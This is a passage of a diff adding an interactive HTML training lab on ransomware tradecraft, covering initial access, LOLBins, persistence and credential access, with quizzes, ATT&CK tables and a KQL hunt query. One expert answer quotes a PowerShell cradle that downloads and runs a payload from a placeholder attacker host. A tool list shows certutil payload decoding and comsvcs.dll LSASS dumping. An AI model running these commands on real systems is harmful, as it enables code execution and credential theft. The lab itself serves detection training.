@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ransomware Ecosystem — Module 2 Lab</title>
+<style>
+  :root {
+    --bg: #0d1117; --surface: #161b22; --surface2: #1f2937; --border: #30363d;
+    --accent: #f97316; --accent2: #3b82f6; --green: #22c55e; --red: #ef4444;
+    --yellow: #eab308; --text: #e6edf3; --muted: #8b949e; --card: #1c2128;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 14px; line-height: 1.5; min-height: 100vh; }
+  .screen { display: none; min-height: 100vh; }
+  .screen.active { display: flex; flex-direction: column; }
+  #screen-intro { align-items: center; justify-content: center; padding: 24px; background: radial-gradient(ellipse at 60% 20%, #1a0802 0%, var(--bg) 70%); }
+  .intro-card { max-width: 680px; width: 100%; text-align: center; }
+  .logo { font-size: 48px; margin-bottom: 12px; }
+  .intro-card h1 { font-size: 26px; font-weight: 700; color: var(--accent); margin-bottom: 4px; }
+  .intro-card .subtitle { color: var(--muted); margin-bottom: 24px; font-size: 13px; }
+  .intro-card p { color: #c9d1d9; margin-bottom: 20px; font-size: 14px; }
+  .badge-row { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 28px; }
+  .badge { background: var(--surface2); border: 1px solid var(--border); border-radius: 20px; padding: 4px 14px; font-size: 12px; color: var(--muted); }
+  .btn-primary { background: var(--accent); color: #000; border: none; border-radius: 8px; padding: 12px 32px; font-size: 15px; font-weight: 700; cursor: pointer; transition: opacity .15s; }
+  .btn-primary:hover { opacity: .85; }
+  .btn-secondary { background: transparent; color: var(--accent2); border: 1px solid var(--accent2); border-radius: 8px; padding: 10px 24px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all .15s; }
+  .btn-secondary:hover { background: var(--accent2); color: #fff; }
+  .sections-preview { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 24px; text-align: left; }
+  .section-chip { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 10px 14px; }
+  .section-chip .chip-num { color: var(--accent); font-weight: 700; font-size: 12px; }
+  .section-chip .chip-title { font-size: 12px; color: var(--text); }
+  #screen-game { flex-direction: row; }
+  .sidebar { width: 220px; min-width: 220px; background: var(--surface); border-right: 1px solid var(--border); padding: 16px 12px; display: flex; flex-direction: column; gap: 16px; }
+  .sidebar-title { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); }
+  .progress-track { display: flex; flex-direction: column; gap: 4px; }
+  .track-item { display: flex; align-items: center; gap: 8px; padding: 6px 8px; border-radius: 6px; font-size: 12px; border: 1px solid transparent; }
+  .track-item.active { background: var(--surface2); border-color: var(--accent); color: var(--accent); }
+  .track-item.done { color: var(--green); }
+  .track-item.locked { color: var(--muted); }
+  .track-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--border); flex-shrink: 0; }
+  .track-item.active .track-dot { background: var(--accent); }
+  .track-item.done .track-dot { background: var(--green); }
+  .score-box { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; }
+  .score-label { font-size: 11px; color: var(--muted); margin-bottom: 2px; }
+  .score-val { font-size: 24px; font-weight: 800; color: var(--accent); }
+  .score-sub { font-size: 11px; color: var(--muted); }
+  .main-area { flex: 1; overflow-y: auto; padding: 24px; }
+  .section-header { margin-bottom: 20px; }
+  .section-tag { display: inline-block; background: var(--accent); color: #000; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: .1em; padding: 2px 8px; border-radius: 4px; margin-bottom: 8px; }
+  .section-header h2 { font-size: 20px; font-weight: 700; margin-bottom: 6px; }
+  .section-header p { color: #c9d1d9; font-size: 13px; }
+  .content-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 18px; margin-bottom: 16px; }
+  .content-card h3 { font-size: 14px; font-weight: 700; color: var(--accent2); margin-bottom: 10px; }
+  .content-card p { color: #c9d1d9; font-size: 13px; margin-bottom: 8px; }
+  .content-card ul { padding-left: 18px; color: #c9d1d9; font-size: 13px; }
+  .content-card li { margin-bottom: 5px; }
+  .quiz-block { background: var(--surface2); border: 1px solid var(--border); border-radius: 10px; padding: 16px; margin-bottom: 16px; }
+  .quiz-q { font-size: 14px; font-weight: 600; margin-bottom: 14px; }
+  .options { display: flex; flex-direction: column; gap: 8px; }
+  .option-btn { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 10px 14px; text-align: left; color: var(--text); font-size: 13px; cursor: pointer; transition: all .15s; }
+  .option-btn:hover:not(:disabled) { border-color: var(--accent2); background: var(--surface); }
+  .option-btn.correct { border-color: var(--green) !important; background: rgba(34,197,94,.12) !important; color: var(--green) !important; }
+  .option-btn.wrong { border-color: var(--red) !important; background: rgba(239,68,68,.12) !important; color: var(--red) !important; }
+  .feedback { margin-top: 12px; padding: 10px 14px; border-radius: 8px; font-size: 13px; display: none; }
+  .feedback.show { display: block; }
+  .feedback.correct { background: rgba(34,197,94,.15); border: 1px solid var(--green); color: var(--green); }
+  .feedback.wrong { background: rgba(239,68,68,.1); border: 1px solid var(--red); color: #fca5a5; }
+  .nav-row { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; padding-top: 16px; border-top: 1px solid var(--border); }
+  .btn-nav { background: var(--surface2); border: 1px solid var(--border); color: var(--text); border-radius: 8px; padding: 8px 20px; font-size: 13px; font-weight: 600; cursor: pointer; transition: all .15s; }
+  .btn-nav:hover { border-color: var(--accent); color: var(--accent); }
+  .btn-nav.next { background: var(--accent); color: #000; border-color: var(--accent); }
+  .btn-nav.next:hover { opacity: .85; }
+  .discuss-block { background: rgba(59,130,246,.08); border: 1px solid rgba(59,130,246,.3); border-radius: 10px; padding: 16px; margin-top: 16px; }
+  .discuss-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .08em; color: var(--accent2); margin-bottom: 8px; }
+  .discuss-q { font-size: 13px; color: #c9d1d9; margin-bottom: 10px; }
+  .discuss-input { width: 100%; background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 8px 10px; color: var(--text); font-size: 13px; resize: vertical; min-height: 60px; font-family: inherit; }
+  .discuss-input:focus { outline: none; border-color: var(--accent2); }
+  .btn-reveal { background: var(--surface2); border: 1px solid var(--accent2); color: var(--accent2); border-radius: 6px; padding: 6px 14px; font-size: 12px; cursor: pointer; margin-top: 8px; }
+  .expert-answer { background: var(--card); border-left: 3px solid var(--accent2); padding: 10px 14px; margin-top: 10px; font-size: 12px; color: #c9d1d9; border-radius: 0 6px 6px 0; display: none; }
+  .expert-answer.show { display: block; }
+  .info-banner { background: rgba(249,115,22,.1); border: 1px solid rgba(249,115,22,.3); border-radius: 8px; padding: 10px 14px; font-size: 12px; color: #fcd34d; margin-bottom: 14px; }
+  .points-pop { position: fixed; top: 20px; right: 20px; background: var(--green); color: #000; font-weight: 800; font-size: 16px; border-radius: 8px; padding: 8px 16px; opacity: 0; transform: translateY(-10px); transition: all .3s; pointer-events: none; z-index: 999; }
+  .points-pop.show { opacity: 1; transform: translateY(0); }
+  #screen-results { align-items: center; justify-content: center; padding: 24px; background: radial-gradient(ellipse at 50% 10%, #001a0a 0%, var(--bg) 70%); }
+  .results-card { max-width: 620px; width: 100%; text-align: center; }
+  .results-card h1 { font-size: 28px; font-weight: 800; color: var(--green); margin-bottom: 8px; }
+  .final-score { font-size: 72px; font-weight: 900; color: var(--accent); line-height: 1; margin: 16px 0; }
+  .grade-label { font-size: 18px; font-weight: 700; margin-bottom: 20px; }
+  .result-breakdown { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 24px; }
+  .rb-item { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; }
+  .rb-num { font-size: 22px; font-weight: 800; color: var(--accent2); }
+  .rb-label { font-size: 11px; color: var(--muted); margin-top: 2px; }
+  .key-lessons { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 16px; text-align: left; margin-bottom: 20px; }
+  .key-lessons h3 { font-size: 13px; font-weight: 700; color: var(--accent); margin-bottom: 10px; }
+  .key-lessons li { font-size: 12px; color: #c9d1d9; margin-bottom: 6px; margin-left: 16px; }
+  /* detection table */
+  .det-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  .det-table th { text-align: left; padding: 7px; color: var(--muted); border-bottom: 1px solid var(--border); }
+  .det-table td { padding: 7px; color: #c9d1d9; border-bottom: 1px solid var(--border); vertical-align: top; }
+  .det-table td:first-child { color: var(--accent); font-weight: 700; }
+  .att-id { display: inline-block; background: var(--surface2); border-radius: 4px; padding: 1px 6px; font-size: 10px; color: var(--accent2); font-family: monospace; }
+  /* multi-select signals */
+  .signal-btn { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 8px 14px; font-size: 12px; cursor: pointer; transition: all .15s; display: inline-block; margin: 3px; color: var(--text); }
+  .signal-btn:hover:not(:disabled) { border-color: var(--accent2); }
+  .signal-btn.selected { border-color: var(--accent); background: rgba(249,115,22,.15); }
+  .signal-btn.signal-correct { border-color: var(--green) !important; background: rgba(34,197,94,.12) !important; color: var(--green) !important; }
+  .signal-btn.signal-wrong { border-color: var(--red) !important; background: rgba(239,68,68,.12) !important; color: var(--red) !important; }
+  /* self-assessment */
+  .assess-row { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--border); }
+  .assess-label { flex: 1; font-size: 12px; color: #c9d1d9; }
+  .radio-group { display: flex; gap: 6px; }
+  .radio-btn { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; padding: 4px 10px; font-size: 11px; cursor: pointer; transition: all .15s; color: var(--muted); }
+  .radio-btn:hover { border-color: var(--accent2); color: var(--text); }
+  .radio-btn.sel-strong { border-color: var(--green); background: rgba(34,197,94,.15); color: var(--green); }
+  .radio-btn.sel-partial { border-color: var(--yellow); background: rgba(234,179,8,.12); color: var(--yellow); }
+  .radio-btn.sel-absent { border-color: var(--red); background: rgba(239,68,68,.1); color: var(--red); }
+  .kql-block { background: #0d1117; border: 1px solid var(--border); border-radius: 8px; padding: 12px; font-family: 'Courier New', monospace; font-size: 11px; color: #79c0ff; margin: 10px 0; overflow-x: auto; white-space: pre; }
+  @media (max-width: 700px) {
+    #screen-game { flex-direction: column; }
+    .sidebar { width: 100%; flex-direction: row; flex-wrap: wrap; padding: 10px; }
+    .sections-preview { grid-template-columns: 1fr; }
+    .result-breakdown { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+<div id="points-pop" class="points-pop">+10 pts</div>
+
+<!-- INTRO -->
+<div id="screen-intro" class="screen active">
+  <div class="intro-card">
+    <div class="logo">🎯</div>
+    <h1>Adversary Tradecraft</h1>
+    <div class="subtitle">Module 2 — TTPs, Telemetry &amp; Detection Content &nbsp;·&nbsp; Interactive Lab</div>
+    <p>You have read the Module 2 briefing. Now prove you own it. Six challenges covering initial access exploits, execution tradecraft, credential access, defence evasion, exfiltration, and the self-assessment checklist — with KQL, Sigma, and ATT&amp;CK throughout.</p>
+    <div class="sections-preview">
+      <div class="section-chip"><div class="chip-num">PART 1</div><div class="chip-title">📡 Initial Access</div></div>
+      <div class="section-chip"><div class="chip-num">PART 2</div><div class="chip-title">⚙️ Execution &amp; Persistence</div></div>
+      <div class="section-chip"><div class="chip-num">PART 3</div><div class="chip-title">🔑 Credential Access &amp; PrivEsc</div></div>
+      <div class="section-chip"><div class="chip-num">PART 4</div><div class="chip-title">👻 Defence Evasion &amp; Exfiltration</div></div>
+      <div class="section-chip"><div class="chip-num">PART 5</div><div class="chip-title">💀 Encryption &amp; Actor Profiles</div></div>
+      <div class="section-chip"><div class="chip-num">PART 6</div><div class="chip-title">✅ Self-Assessment Checklist</div></div>
+    </div>
+    <div class="badge-row">
+      <div class="badge">⏱ ~20 min</div>
+      <div class="badge">6 sections</div>
+      <div class="badge">Score tracked</div>
+      <div class="badge">Max 200 pts</div>
+    </div>
+    <button class="btn-primary" onclick="startGame()">Start Lab →</button>
+  </div>
+</div>
+
+<!-- GAME -->
+<div id="screen-game" class="screen">
+  <div class="sidebar">
+    <div>
+      <div class="sidebar-title">Progress</div>
+      <div class="progress-track" id="progress-track"></div>
+    </div>
+    <div>
+      <div class="score-box">
+        <div class="score-label">Score</div>
+        <div class="score-val" id="score-display">0</div>
+        <div class="score-sub">/ 200 pts</div>
+      </div>
+    </div>
+  </div>
+  <div class="main-area" id="main-area"></div>
+</div>
+
+<!-- RESULTS -->
+<div id="screen-results" class="screen">
+  <div class="results-card">
+    <div class="logo">🏆</div>
+    <h1>Lab Complete</h1>
+    <div class="final-score" id="final-score">0</div>
+    <div class="grade-label" id="grade-label"></div>
+    <div class="result-breakdown">
+      <div class="rb-item"><div class="rb-num" id="rb-correct">0</div><div class="rb-label">Points earned</div></div>
+      <div class="rb-item"><div class="rb-num">6</div><div class="rb-label">Sections completed</div></div>
+      <div class="rb-item"><div class="rb-num" id="rb-pct">0%</div><div class="rb-label">Score rate</div></div>
+    </div>
+    <div class="key-lessons">
+      <h3>🔑 Key takeaways from Module 2</h3>
+      <ul>
+        <li>Ransomware affiliates spend <strong>3–14 days</strong> in your environment before detonating — dwell time is the detection window.</li>
+        <li>LOLBins and legitimate RATs evade signature detection — <strong>behavioural context and baselining</strong> are the countermeasure.</li>
+        <li>LSASS protection (<strong>PPL + Credential Guard</strong>) is the single highest-impact credential-access countermeasure.</li>
+        <li>VSS deletion and bcdedit commands are the <strong>highest-confidence pre-encryption signals</strong> — alert as critical, auto-respond.</li>
+        <li>Rclone renamed to svchost32.exe still has characteristic <strong>command-line arguments</strong> — detect behaviour, not binary name.</li>
+        <li>If your detection stack only fires on encryption, <strong>the attacker has already won</strong>.</li>
+      </ul>
+    </div>
+    <div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap;">
+      <button class="btn-secondary" onclick="restartGame()">↺ Restart Lab</button>
+      <button class="btn-primary" onclick="alert('Proceed to Module 3: Negotiation Playbook.')">Module 3 →</button>
+    </div>
+  </div>
+</div>
+
+<script>
+var score = 0;
+var currentSection = 0;
+var sections = [
+  { label: 'Initial Access', icon: '📡' },
+  { label: 'Execution & Persistence', icon: '⚙️' },
+  { label: 'Credential Access & PrivEsc', icon: '🔑' },
+  { label: 'Defence Evasion & Exfil', icon: '👻' },
+  { label: 'Encryption & Actor Profiles', icon: '💀' },
+  { label: 'Self-Assessment', icon: '✅' },
+];
+var _evasionSelected = {};
+var _evasionScored = false;
+var _assessScored = false;
+var _assessAnswers = {};
+
+function startGame() { showScreen('screen-game'); renderSidebar(); renderSection(0); }
+
+function showScreen(id) {
+  document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
+  document.getElementById(id).classList.add('active');
+}
+
+function renderSidebar() {
+  var track = document.getElementById('progress-track');
+  track.innerHTML = sections.map(function(s, i) {
+    var cls = i === currentSection ? 'active' : i < currentSection ? 'done' : 'locked';
+    return '<div class="track-item ' + cls + '"><div class="track-dot"></div><span>' + s.icon + ' ' + s.label + '</span></div>';
+  }).join('');
+  document.getElementById('score-display').textContent = score;
+}
+
+function addPoints(pts) {
+  score += pts;
+  document.getElementById('score-display').textContent = score;
+  var pop = document.getElementById('points-pop');
+  pop.textContent = '+' + pts + ' pts';
+  pop.classList.add('show');
+  setTimeout(function(){ pop.classList.remove('show'); }, 1500);
+}
+
+function nextSection() {
+  currentSection++;
+  if (currentSection >= sections.length) { showResults(); return; }
+  renderSidebar();
+  renderSection(currentSection);
+  document.querySelector('.main-area').scrollTop = 0;
+}
+
+function prevSection() {
+  if (currentSection > 0) { currentSection--; renderSidebar(); renderSection(currentSection); document.querySelector('.main-area').scrollTop = 0; }
+}
+
+function answerQ(qid, btn, correct, msg) {
+  var opts = btn.parentElement.querySelectorAll('.option-btn');
+  opts.forEach(function(b){ b.disabled = true; });
+  var fb = document.getElementById(qid + '-feedback');
+  if (!fb) return;
+  if (correct) {
+    btn.classList.add('correct');
+    fb.innerHTML = '✅ ' + msg;
+    fb.className = 'feedback show correct';
+    addPoints(10);
+  } else {
+    btn.classList.add('wrong');
+    fb.innerHTML = '❌ ' + msg;
+    fb.className = 'feedback show wrong';
+  }
+}
+
+function toggleExpert(id) {
+  var el = document.getElementById(id);
+  if (el) el.classList.toggle('show');
+}
+
+function showResults() {
+  showScreen('screen-results');
+  document.getElementById('final-score').textContent = score;
+  var pct = Math.round((score / 200) * 100);
+  document.getElementById('rb-correct').textContent = score;
+  document.getElementById('rb-pct').textContent = pct + '%';
+  var grade, col;
+  if (pct >= 80) { grade = '🏆 Expert'; col = '#22c55e'; }
+  else if (pct >= 60) { grade = '🎖️ Proficient'; col = '#3b82f6'; }
+  else if (pct >= 40) { grade = '📘 Developing'; col = '#eab308'; }
+  else { grade = '🔄 Needs review'; col = '#ef4444'; }
+  var gl = document.getElementById('grade-label');
+  gl.textContent = grade; gl.style.color = col;
+}
+
+function restartGame() {
+  score = 0; currentSection = 0; _evasionSelected = {}; _evasionScored = false; _assessScored = false; _assessAnswers = {};
+  showScreen('screen-game'); renderSidebar(); renderSection(0);
+}
+
+function renderSection(idx) {
+  var renderers = [renderS1, renderS2, renderS3, renderS4, renderS5, renderS6];
+  document.getElementById('main-area').innerHTML = renderers[idx]();
+}
+
+// ── S1: Initial Access ────────────────────────────────────────────────────────
+function renderS1() {
+  return '<div class="section-header"><div class="section-tag">Part 1 of 6</div><h2>📡 Initial Access</h2><p>Six initial-access families dominate ransomware intrusions. Understanding how affiliates get in is prerequisite to detection and hardening.</p></div>'
+  + '<div class="content-card"><h3>Six Initial Access Families</h3>'
+  + '<ul>'
+  + '<li><strong>Phishing</strong> — HTML smuggling, ISO/IMG/LNK chains. Delivers infostealers and loaders via email. T1566.</li>'
+  + '<li><strong>Valid credentials from infostealers</strong> — Redline, Lumma, Vidar harvest browser credentials and session cookies. Logs sold $10–50 on forums. T1078.</li>'
+  + '<li><strong>Public-facing app exploitation</strong> — Citrix Bleed (CVE-2023-4966), Ivanti (CVE-2023-46805), ScreenConnect (CVE-2024-1709). KEV-listed; patch SLA must be hours, not weeks. T1190.</li>'
+  + '<li><strong>External remote services</strong> — Exposed RDP/VPN without MFA. Still the most common single root cause in incident post-mortems. T1133.</li>'
+  + '<li><strong>Trusted relationships / MSP compromise</strong> — One MSP breach delivers access to hundreds of customers. T1199.</li>'
+  + '<li><strong>Social engineering of help desks</strong> — Scattered Spider vishing: English-speaking caller impersonates employee, resets MFA. T1566.004.</li>'
+  + '</ul></div>'
+  + '<div class="content-card"><h3>Detection Opportunities</h3>'
+  + '<div style="overflow-x:auto;"><table class="det-table">'
+  + '<tr><th>Technique</th><th>ATT&CK ID</th><th>Telemetry source</th></tr>'
+  + '<tr><td>AitM phishing / Evilginx</td><td><span class="att-id">T1557</span></td><td>Entra ID / AAD Sign-in Logs — Satisfied MFA + non-compliant device + unknown TrustType</td></tr>'
+  + '<tr><td>Infostealer credential use</td><td><span class="att-id">T1078</span></td><td>Conditional Access risky-sign-in alert; first-seen ASN/IP for user</td></tr>'
+  + '<tr><td>CVE exploitation (edge device)</td><td><span class="att-id">T1190</span></td><td>WAF/IDS; vendor-specific exploit indicators; patch compliance gap report</td></tr>'
+  + '<tr><td>RDP without MFA</td><td><span class="att-id">T1133</span></td><td>Network flow; Windows Security 4624 Type 10 from external IP</td></tr>'
+  + '<tr><td>Help-desk vishing</td><td><span class="att-id">T1566.004</span></td><td>MFA reset event + anomalous sign-in within 15 min — Sigma rule in Module 2</td></tr>'
+  + '</table></div></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 Which CVE is associated with "Citrix Bleed" — an auth-bypass on NetScaler that leaked session tokens?</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q1a\',this,false,\'That\'s Log4Shell — an Apache logging vulnerability, not Citrix.\')">A: CVE-2021-44228 (Log4Shell)</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q1a\',this,true,\'Correct. Citrix Bleed (CVE-2023-4966) allowed unauthenticated actors to retrieve session tokens from Citrix NetScaler ADC and Gateway, bypassing authentication entirely. It was heavily exploited by LockBit affiliates and others in late 2023.\')">B: CVE-2023-4966 ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q1a\',this,false,\'That\'s ScreenConnect — a different critical auth bypass, also heavily exploited but distinct from Citrix Bleed.\')">C: CVE-2024-1709</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q1a\',this,false,\'That\'s MOVEit Transfer — a SQL injection vulnerability exploited by Cl0p, not Citrix.\')">D: CVE-2023-34362</button>'
+  + '</div><div class="feedback" id="q1a-feedback"></div></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 Adversary-in-the-Middle (AitM) phishing kits like Evilginx defeat which specific MFA mechanism?</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q1b\',this,false,\'FIDO2 is specifically resistant to AitM attacks — the cryptographic binding to origin prevents token replay.\')">A: FIDO2/WebAuthn hardware keys</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q1b\',this,true,\'Correct. AitM kits proxy the login page in real time, relaying MFA challenges and harvesting session cookies after authentication completes. Push-notification MFA is defeated because the cookie is valid. FIDO2/WebAuthn is specifically resistant.\')">B: Push-notification MFA (e.g. Microsoft Authenticator) ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q1b\',this,false,\'AitM defeats push MFA too, not just SMS. Push-notification MFA is the specific mechanism called out.\')">C: SMS OTP codes only</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q1b\',this,false,\'Certificate-based auth is not defeated by AitM in the same way — session cookies can\'t be replayed against cert-bound sessions.\')">D: Certificate-based authentication</button>'
+  + '</div><div class="feedback" id="q1b-feedback"></div></div>'
+  + '<div class="discuss-block"><div class="discuss-label">💬 Discussion — Section 1</div>'
+  + '<div class="discuss-q">Your SOC fires an alert on a high-risk sign-in from an unfamiliar IP — conditional access flagged it as medium risk but did not block. What is your immediate investigation checklist, and at what point do you treat it as a confirmed compromise versus a false positive?</div>'
+  + '<textarea class="discuss-input" placeholder="Write your checklist before revealing the expert view..."></textarea>'
+  + '<button class="btn-reveal" onclick="toggleExpert(\'exp1\')">Reveal expert perspective</button>'
+  + '<div class="expert-answer" id="exp1">The Module 2 approach: check DeviceDetail.IsCompliant and DeviceDetail.TrustType — a compliant managed device reduces likelihood of AitM; an unrecognised device increases it. Check for inbox-rule creation or OAuth-grant creation events in the following 15 minutes. The sample Sigma rule in Module 2 specifically targets: satisfied MFA + non-compliant device + unknown trust type = high confidence. False-positive rate is low. Treatment as confirmed compromise triggers session revocation, full identity investigation, and escalation.</div>'
+  + '</div>'
+  + '<div class="nav-row"><span></span><button class="btn-nav next" onclick="nextSection()">Execution &amp; Persistence →</button></div>';
+}
+
+// ── S2: Execution & Persistence ───────────────────────────────────────────────
+function renderS2() {
+  return '<div class="section-header"><div class="section-tag">Part 2 of 6</div><h2>⚙️ Execution &amp; Persistence</h2><p>After initial access, affiliates establish a beachhead using signed binaries and legitimate remote-access tools that blend with normal IT activity.</p></div>'
+  + '<div class="content-card"><h3>Living-Off-the-Land Binaries (LOLBins)</h3>'
+  + '<p>Attackers prefer binaries already on the system — they are signed, trusted, and often allowlisted by security tools. Common LOLBins:</p>'
+  + '<ul>'
+  + '<li><strong>PowerShell</strong> — encoded commands (-EncodedCommand), download cradles (IEX + WebClient), AMSI bypass</li>'
+  + '<li><strong>WMIC</strong> — remote process execution, lateral movement commands</li>'
+  + '<li><strong>mshta.exe</strong> — executes HTA files, commonly used for payload delivery</li>'
+  + '<li><strong>certutil.exe</strong> — decode Base64-encoded payloads: certutil -decode payload.b64 payload.exe</li>'
+  + '<li><strong>bitsadmin.exe</strong> — background file transfer, download payloads quietly</li>'
+  + '<li><strong>rundll32.exe</strong> — execute DLLs: comsvcs.dll MiniDump for LSASS</li>'
+  + '</ul></div>'
+  + '<div class="content-card"><h3>Legitimate Remote-Access Tools (RATs)</h3>'
+  + '<p>AnyDesk, ScreenConnect, Atera, NinjaRMM — installed to look like admin activity. CISA repeatedly flags this pattern. Detection approach: alert on first-seen RAT binary install on non-admin hosts.</p>'
+  + '<div class="kql-block">// Hunt: newly-installed remote-access tools on non-admin hosts\nDeviceFileEvents\n| where ActionType == "FileCreated"\n| where FolderPath !startswith @"C:\\Program Files\\IT-Admin\\"  \n| where FileName has_any("AnyDesk","ScreenConnect","atera","NinjaRMM","TeamViewer")\n| where DeviceName !in (AdminHostList)\n| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName</div>'
+  + '</div>'
+  + '<div class="content-card"><h3>Persistence Mechanisms</h3>'
+  + '<ul>'
+  + '<li><strong>Scheduled Tasks</strong> T1053.005 — survives reboot, blends with legitimate admin tasks</li>'
+  + '<li><strong>Run Keys</strong> T1547.001 — HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</li>'
+  + '<li><strong>Services</strong> T1543.003 — New service with SYSTEM privileges</li>'
+  + '<li><strong>WMI Subscriptions</strong> T1546.003 — Fileless, survives reboot, missed by many AV products</li>'
+  + '<li><strong>IFEO Debugger</strong> T1546.012 — Image File Execution Options hijack</li>'
+  + '</ul></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 Why do ransomware affiliates prefer legitimate remote-access tools (AnyDesk, ScreenConnect) over custom malware for persistence?</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q2a\',this,false,\'Encryption quality is not the primary reason — custom malware can also encrypt comms.\')">A: They encrypt traffic better than custom malware</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q2a\',this,true,\'Correct. Legitimate remote-access tools are signed by trusted vendors, often already present in enterprise environments, and frequently allowlisted by AV/EDR. They survive reboots without modification and don\'t trigger signature-based detection. Module 2 notes CISA repeatedly flags this pattern.\')">B: They are signed binaries that blend with normal admin activity and are often allowlisted ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q2a\',this,false,\'Deployment speed is not the primary advantage — the evasion benefit is.\')">C: They are faster to deploy than custom implants</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q2a\',this,false,\'They work cross-platform, but that\'s not the primary reason for their use.\')">D: They work on Linux and macOS exclusively</button>'
+  + '</div><div class="feedback" id="q2a-feedback"></div></div>'
+  + '<div class="quiz-block"><div class="quiz-q">🎯 PowerShell ScriptBlock logging (Event ID 4104) is critical for detection. What does it capture that standard process logging misses?</div>'
+  + '<div class="options">'
+  + '<button class="option-btn" onclick="answerQ(\'q2b\',this,false,\'Network connections are captured by process/network telemetry, not ScriptBlock logging specifically.\')">A: Network connections made by PowerShell processes</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q2b\',this,true,\'Correct. ScriptBlock logging captures the actual code PowerShell executes — after any decoding or deobfuscation — in EID 4104. This is why attackers use AMSI bypass techniques before running malicious scripts. Without it, you see the encoded blob; with it, you see what it actually does.\')">B: The actual content of PowerShell commands — including decoded, deobfuscated scripts ✓</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q2b\',this,false,\'Registry changes are captured by Sysmon EID 13/14, not ScriptBlock logging.\')">C: Registry changes made by PowerShell</button>'
+  + '<button class="option-btn" onclick="answerQ(\'q2b\',this,false,\'User context appears in process creation logs (EID 4688/Sysmon 1), not specifically ScriptBlock logging.\')">D: User identity context of PowerShell invocations</button>'
+  + '</div><div class="feedback" id="q2b-feedback"></div></div>'
+  + '<div class="discuss-block"><div class="discuss-label">💬 Discussion — Section 2</div>'
+  + '<div class="discuss-q">Walk through how an attacker would use PowerShell to download and execute a Cobalt Strike beacon without touching disk. What three detection opportunities exist in your environment — and which one fires first?</div>'
+  + '<textarea class="discuss-input" placeholder="Describe the cradle, then identify your three detection points..."></textarea>'
+  + '<button class="btn-reveal" onclick="toggleExpert(\'exp2\')">Reveal expert perspective</button>'
+  + '<div class="expert-answer" id="exp2">The classic cradle: <code>IEX (New-Object Net.WebClient).DownloadString(\'http://attacker/payload\')</code>. Detection opportunities: (1) ScriptBlock log EID 4104 captures the decoded IEX string — fires on execution; (2) Network connection from powershell.exe to an unusual external IP — fires on download; (3) Sysmon EID 3 network connection with suspicious parent process — fires on connection. The fastest is typically the network telemetry, but ScriptBlock logging gives the richest context. AMSI catches this before execution if signatures are current.</div>'
+  + '</div>'
+  + '<div class="nav-row"><button class="btn-nav" onclick="prevSection()">← Initial Access</button><button class="btn-nav next" onclick="nextSection()">Credential Access →</button></div>';
+}
+
+// ── S3: Credential Access & PrivEsc ──────────────────────────────────────────
+function renderS3() {
+  return '<div class="section-header"><div class="section-tag">Part 3 of 6</div><h2>🔑 Credential Access &amp; Privilege Escalation</h2><p>With a foothold established, affiliates move to harvest credentials and escalate privileges — targeting Active Directory as the crown jewel.</p></div>'
+  + '<div class="content-card"><h3>Credential Access Techniques</h3>'
+  + '<div style="overflow-x:auto;"><table class="det-table">'
+  + '<tr><th>Technique</th><th>ATT&CK ID</th><th>Detection</th></tr>'
+  + '<tr><td>LSASS dumping (Mimikatz/ProcDump/comsvcs.dll/NanoDump)</td><td><span class="att-id">T1003.001</span></td><td>Sysmon EID 10 (LSASS access); ASR rule "Block credential stealing from LSASS"; PPL mitigates</td></tr>'
+  + '<tr><td>Kerberoasting (TGS-REQ for SPN, RC4-HMAC)</td><td><span class="att-id">T1558.003</span></td><td>Security EID 4769 with EncryptionType 0x17 (RC4) for service accounts</td></tr>'
+  + '<tr><td>AS-REP Roasting (no-pre-auth accounts)</td><td><span class="att-id">T1558.004</span></td><td>Security EID 4768 with EncryptionType 0x17 for accounts without pre-auth</td></tr>'
